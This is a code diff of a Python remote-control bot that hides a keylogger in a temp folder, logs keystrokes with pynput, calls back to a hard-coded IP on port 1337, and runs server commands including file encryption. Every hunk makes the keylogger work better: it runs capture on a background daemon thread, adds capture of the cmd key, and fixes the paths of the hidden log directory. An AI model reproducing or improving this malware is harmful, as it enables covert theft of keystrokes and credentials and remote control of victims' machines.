@@ -14,7 +14,7 @@ try:
 	from sys import exit # Import exit from sys to quit program when specified.
 	from platform import system # Import system from platform to detect os.
 	from pynput import keyboard # Import keyboard to perform keylogger operations.
-	from threading import Timer # Import Timer to create thread that'll run every 20s.
+	from threading import Timer, Thread # Import Timer to create thread that'll run every 20s.
 	from cryptography.fernet import Fernet # Import Fernet for encryption.
 except ImportError as e:
     print(f'Import error: {e}')
@@ -26,8 +26,8 @@ FILENAME = __file__[2:] # The name of this file.
 SYSTEM = system() # The operating this program is being ran on.
 IP = '192.168.31.134' # IP address to connect to.
 PORT = 1337 # Port number to create socket with.
-LIN_DIR = '/tmp/.folder' # Hidden Linux folder to create for our keylogger.
-WIN_DIR = r'%temp%\.folder' # Hideen Windows folder to create for our keylogger.
+LIN_DIR = '/tmp/.folder/' # Hidden Linux folder to create for our keylogger.
+WIN_DIR = r'%temp%\.folder\\' # Hideen Windows folder to create for our keylogger.
 SECONDS_TO_LOG = 30 # Number of the seconds to wait before logging keystrokes to file.
 LOG = '' # Will store the keystrokes of the user.
 COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.
@@ -142,6 +142,7 @@ def on_press(key):
 		elif key == key.backspace: LOG += '' # If key is backspace, do not append anything.
 		elif key == key.ctrl: LOG += ' ctrl+' # If control key is pressed append string 'ctrl+' followed by key pressed.
 		elif key == key.tab: LOG += '\t' # If tab key is pressed, append tab to string.
+		elif key == key.cmd: LOG += ' cmd+'
 		else:
 			LOG += str(key) # Append any other special key not handled above.
 
@@ -154,12 +155,13 @@ def log_to_file():
 			None
 	"""
 	if SYSTEM == 'Linux':
-		f = open(LIN_DIR + 'log.txt', 'w+') # Linux: Create and open file 'log.txt' to write captured keystrokes.
+		f = open(LIN_DIR + 'log.txt', 'w') # Linux: Create and open file 'log.txt' to write captured keystrokes.
 		f.write(LOG) # Write keystrokes to file.
 	else:
-		f = open(WIN_DIR + 'log.txt', 'w+') # Windows: Create and open file 'log.txt' to write captured keystrokes.
+		f = open(WIN_DIR + 'log.txt', 'w') # Windows: Create and open file 'log.txt' to write captured keystrokes.
 		f.write(LOG) # Write keystrokes to file.
 	cycle = Timer(SECONDS_TO_LOG, log_to_file) # Set this thread to run every 30 seconds.
+	cycle.daemon = True
 	cycle.start() # Start the time threading operaton.
 
 def keylogger():
@@ -169,18 +171,22 @@ def keylogger():
 		Returns:
 			Confirmation string.
 	"""
-	with keyboard.Listener(
-		onpress=on_press) as capturer: # Creating keystrokes capturer object in context manager.
-		try:
-			if SYSTEM == 'Linux':
-				os.mkdir(LIN_DIR) # Attempt to create hidden directory in Linux temp folder.
-			else:
-				os.mkdir(WIN_DIR) # Attempt to create hidden direcotry in Windows temp folder.
-			log_to_file() # Begin thread for logging to file every 30s.
-			capturer.join() # Collent keystrokes until program exit.
-		except OSError: # Ignore os error.
-			pass
-	return r'Keylogger initiated...' # Return confirmation string.
+	listener = keyboard.Listener(on_press=on_press) # Creating keystrokes listener object in context manager.
+	try:
+		if SYSTEM == 'Linux':
+			os.mkdir(LIN_DIR) # Attempt to create hidden directory in Linux temp folder.
+		else:
+			os.mkdir(WIN_DIR) # Attempt to create hidden direcotry in Windows temp folder.
+		log_to_file() # Begin thread for logging to file every 30s.
+		listener.start() # Collent keystrokes until program exit.
+	except OSError: # Ignore os error.
+		pass
+
+def start_keylogger_thread():
+	"""
+	"""
+	t = Thread(target=keylogger, daemon=True)
+	t.start()
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -266,7 +272,8 @@ class WindowsBot:
 					command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
 					command_output = None
 					if command.strip() == 'keylog': # Start the keylogger.
-						command_output = keylogger()
+						start_keylogger_thread()
+						command_output = r'Keylogger initiated...'
 					elif command[:7] == 'encrypt': # Encrypt file specified.
 						command_output = crypto(command[:7], command[8:])
 					elif command[:7] == 'decrypt': # Decrypt file with key.
